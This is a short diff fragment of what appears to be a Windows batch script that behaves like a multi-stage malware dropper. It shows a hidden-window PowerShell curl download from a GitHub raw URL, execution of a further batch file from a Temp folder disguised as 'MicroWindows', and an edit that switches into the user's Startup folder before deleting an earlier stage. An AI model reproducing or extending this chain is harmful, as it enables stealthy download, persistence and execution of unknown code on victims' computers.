@@ -8,5 +8,5 @@ powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent
 
 cd C:\Users\%username%\AppData\Local\Temp\MicroWindows
 powershell ./third.bat
-cd %currentd%
+cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 del secondary.bat
